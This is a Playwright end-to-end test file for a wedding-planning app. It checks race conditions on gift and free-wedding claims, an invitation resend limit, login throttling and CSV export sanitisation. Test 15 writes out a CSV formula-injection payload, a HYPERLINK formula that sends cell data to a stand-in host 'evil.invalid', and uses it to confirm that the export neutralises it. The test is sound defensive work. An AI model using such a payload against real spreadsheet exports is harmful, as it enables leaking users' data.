import { test, expect } from "@playwright/test";
import { seed, close, prisma, IDS, EMAILS } from "./seed";
import { signIn, signInAs } from "./helpers";

/**
 * Cases 11–15: the limits that hold under concurrency and under volume.
 *
 * The race tests are the ones that justify this file existing. `races.test.ts`
 * proves the conditional `updateMany` is correct by calling the service twice
 * against a fake client; only a real database can show that two genuinely
 * simultaneous HTTP requests end with one winner, because the guarantee being
 * relied on is row-level locking inside Postgres.
 */

test.beforeAll(async () => {
  await seed();
});

test.afterAll(async () => {
  await close();
});

/* ------------------------------------------------------- gift claim (11) -- */

test("11 · two guests claiming one gift at the same instant produce exactly one winner", async ({
  browser,
}) => {
  const wedding = await prisma.wedding.findUniqueOrThrow({ where: { id: IDS.weddingB } });
  const url = `/w/${wedding.slug}/registry`;

  /**
   * Driven through the real wishlist, not a POST at the page.
   *
   * The claim is a Server Action reached from `useActionState` inside a client
   * component. A hand-rolled POST never invokes it — it re-renders the page and
   * returns 200 — so the previous version of this test could not have failed.
   *
   * Each guest opens the page, presses "I purchased this", types their name and
   * stops with the confirm button focused but unpressed. Both presses are then
   * released together.
   */
  const arm = async (name: string) => {
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto(url);

    // Loud on a mis-seeded fixture: if the gift is not on the page the test
    // fails here, rather than silently claiming nothing and passing.
    await expect(
      page.getByText("Toaster"),
      "the seeded gift must be visible on the public wishlist",
    ).toBeVisible();

    await page.getByRole("button", { name: "I purchased this" }).first().click();
    await expect(page.locator("#claim-name")).toBeVisible();
    await page.fill("#claim-name", name);
    return { context, page };
  };

  const alex = await arm("Alex");
  const sam = await arm("Sam");

  // Released together. Playwright cannot guarantee the two requests reach
  // Postgres in the same millisecond, but both are in flight before either
  // completes — which is the window the conditional updateMany closes.
  await Promise.all([
    alex.page.getByRole("button", { name: /Confirm purchase/ }).click(),
    sam.page.getByRole("button", { name: /Confirm purchase/ }).click(),
  ]);

  // Both pages must settle before the database is read.
  await alex.page.waitForLoadState("networkidle");
  await sam.page.waitForLoadState("networkidle");

  const item = await prisma.registryItem.findUniqueOrThrow({ where: { id: IDS.giftB } });
  expect(item.purchasedBy, "exactly one claimant must be recorded").toBeTruthy();
  expect(["Alex", "Sam"]).toContain(item.purchasedBy);

  const claimed = await prisma.registryItem.count({
    where: { id: IDS.giftB, purchasedBy: { not: null } },
  });
  expect(claimed, "the loser must not have overwritten the winner").toBe(1);

  /**
   * And the loser must have been told, by name.
   *
   * This is the half a database assertion cannot cover: a silent failure would
   * leave one guest believing they had claimed a gift somebody else is also
   * buying, which is the exact outcome the feature exists to prevent.
   */
  const winner = item.purchasedBy as string;
  const loser = winner === "Alex" ? sam.page : alex.page;
  await expect(
    loser.getByText(new RegExp(`${winner} has already marked this one as purchased`)),
    "the losing guest must be told who claimed it first",
  ).toBeVisible({ timeout: 10_000 });

  await alex.context.close();
  await sam.context.close();
});

/* --------------------------------------------- free wedding claim (12) -- */

test("12 · the free wedding cannot be claimed twice by concurrent requests", async () => {
  await prisma.studio.update({
    where: { id: IDS.studioA },
    data: { freeWeddingUsed: false },
  });

  /**
   * Driven at the data layer rather than through the publish UI, because the
   * paid path needs Stripe and the point under test is the conditional write.
   * Two `updateMany` calls racing on `freeWeddingUsed: false` must produce one
   * count of 1 and one count of 0 — the loser falls through to the paid path.
   */
  const attempt = () =>
    prisma.studio.updateMany({
      where: { id: IDS.studioA, freeWeddingUsed: false },
      data: { freeWeddingUsed: true },
    });

  const [first, second] = await Promise.all([attempt(), attempt()]);
  const wins = [first.count, second.count].filter(n => n === 1).length;
  expect(wins, "the free wedding must be claimable exactly once").toBe(1);
});

/* ------------------------------------------------- invitation resend (13) -- */

test("13 · invitation resend is refused after the hourly limit", async ({ browser }) => {
  const { context, page } = await signInAs(browser, EMAILS.plannerA);
  const guestsUrl = `/studio/weddings/${IDS.weddingA}/guests`;

  /**
   * The real button in the guest's own row.
   *
   * It reads "Send" until an invitation has gone out and "Resend" afterwards,
   * and it only renders for a guest who has an email address — so finding it is
   * itself a check that the fixture is right. Scoped to the row, because the
   * page header carries a "Send invitations" button that would otherwise match.
   */
  const clickSend = async () => {
    await page.goto(guestsUrl);
    const row = page.locator("tr", { hasText: "Guest One" }).first();
    await expect(row, "the seeded guest must appear on the guest list").toBeVisible();
    await row.getByRole("button", { name: /^(Send|Resend)$/ }).click();
    /**
     * Wait for the button to leave its sending state, not for the network to
     * fall idle.
     *
     * This used to be a form that navigated, so `networkidle` was a fair proxy
     * for "the send finished". It is now a client action: the click fires a
     * request and the page never navigates, so `networkidle` can resolve while
     * that request is still in flight — and the row count below would then be
     * read mid-send and come back short.
     *
     * The button disables itself and reads "Sending…" for exactly the duration
     * of the request, which makes its absence the precise signal this needs.
     * Nothing about the assertion changes; only the thing it waits on.
     */
    await expect(page.getByRole("button", { name: "Sending…" })).toHaveCount(0, { timeout: 15_000 });
  };

  // Three are allowed in an hour. Attempts four and five must not get through.
  // Wrapped because the fourth press surfaces the limiter's UserError, and how
  // the page reports that is not what is under test here — the count is.
  for (let i = 0; i < 5; i++) {
    await clickSend().catch(() => {});
  }

  /**
   * Exactly three, not "at most three".
   *
   * `toBeLessThanOrEqual` would pass on zero, which is what a test that never
   * reached the button looks like. Requiring the exact number means a broken
   * selector fails as loudly as a broken limiter.
   *
   * Counted regardless of EmailStatus: without RESEND_API_KEY each attempt is
   * recorded SKIPPED, and what is being proved is how many attempts the limiter
   * let past, not whether a message was delivered.
   */
  const emailed = await prisma.emailLog.count({
    where: { studioId: IDS.studioA, toEmail: { contains: IDS.guestA } },
  });
  expect(
    emailed,
    "the limiter must let exactly three invitations through per guest per hour",
  ).toBe(3);

  await context.close();
});

/* ---------------------------------------------------- login throttle (14) -- */

test("14 · repeated bad passwords are throttled rather than answered at full speed", async ({
  browser,
}) => {
  const context = await browser.newContext();
  const page = await context.newPage();

  /**
   * Typed into the real sign-in form.
   *
   * Sign-in is a Server Action, so the previous `request.post("/login")` never
   * reached `gateLogin` — it rendered the login page and returned 200, and the
   * test passed by never observing a rate limit it also never triggered.
   *
   * Asserting on `?error=rate` rather than on elapsed time: the throttle's
   * escalating delay would make a wall-clock assertion the classic flaky test,
   * and the redirect is the observable the product actually produces.
   */
  let attempts = 0;
  let sawRateLimit = false;

  for (let i = 0; i < 12; i++) {
    await page.goto("/login");
    // The dedicated throttle account, never planner A. Spending the limiter on
    // a planner other tests sign in as locked them out for the remaining
    // fifteen minutes and took down case 15 and all of authorization.spec.
    await page.fill('input[name="email"]', EMAILS.throttle);
    await page.fill('input[name="password"]', `wrong-${i}`);
    await Promise.all([
      page.waitForURL(/\/login\?error=/, { timeout: 20_000 }),
      page.click('button[type="submit"]'),
    ]);
    attempts++;
    if (page.url().includes("error=rate")) {
      sawRateLimit = true;
      break;
    }
  }

  // Loud in both directions: it must refuse, and it must have taken real
  // attempts to get there. Tripping on the first try would mean the fixture is
  // already locked out from an earlier test rather than the limiter working.
  expect(sawRateLimit, "login must start refusing before 12 guesses").toBe(true);
  expect(attempts, "the limit must not trip on the very first attempt").toBeGreaterThan(1);

  // Every failure before the lockout must have been reported as a bad password,
  // never as a success — the throttle must not become an accidental bypass.
  expect(page.url()).toContain("/login?error=");

  await context.close();
});

/* ------------------------------------------------- CSV neutralisation (15) -- */

test("15 · a formula typed into an RSVP note is neutralised in the CSV export", async ({
  browser,
}) => {
  const payload = `=HYPERLINK("https://evil.invalid?"&A1,"Invoice")`;

  // ACCEPTED, not ATTENDING. `RsvpStatus` is ACCEPTED | DECLINED | MAYBE; the
  // wrong member is a Prisma validation error at runtime, not a type error
  // here, because the object is inferred before it reaches the client.
  await prisma.rsvp.upsert({
    where: { guestId: IDS.guestA },
    create: { guestId: IDS.guestA, status: "ACCEPTED", notes: payload },
    update: { status: "ACCEPTED", notes: payload },
  });
  // The other three shapes a spreadsheet will evaluate.
  await prisma.guest.update({
    where: { id: IDS.guestA },
    data: { name: "+1 555 0100" },
  });

  const planner = await signIn(browser, EMAILS.plannerA);
  const res = await planner.request.get(`/studio/weddings/${IDS.weddingA}/guests/export`);
  expect(res.status()).toBe(200);
  const csv = await res.text();

  // The value must still be present — neutralising by deleting data would be a
  // different bug — but never at the start of a cell where it would evaluate.
  expect(csv).toContain("HYPERLINK");
  expect(csv, "a cell must not open with a formula character").not.toMatch(/(^|,)"[=+\-@]/m);
  expect(csv, "the leading apostrophe is what stops evaluation").toContain(`"'=HYPERLINK`);
  expect(csv).toContain(`"'+1 555 0100"`);

  await planner.close();
});
